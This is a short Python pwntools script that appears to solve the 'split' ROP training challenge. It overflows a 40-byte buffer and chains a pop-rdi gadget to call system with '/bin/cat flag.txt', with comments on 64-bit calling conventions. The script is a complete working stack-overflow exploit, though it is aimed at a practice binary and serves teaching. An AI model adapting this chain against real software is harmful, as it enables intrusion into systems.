#40074b --> address of system
#601060 --> address of /bin/cat flag.txt
#0x00000000004007c3 : pop rdi ; ret

from pwn import *

# context.terminal = ['bash', '-c']

#the things to learn here is that on 32 bit argument can be directly passed to fun from stack
#but on 64 bit the arguments need to be passed through registers
payload = b'a'*40 + p64(0x4007c3) + p64(0x601060) + p64(0x40074b)

p = process('./split')
#gdb.attach(p)
p.send(payload)
p.interactive()

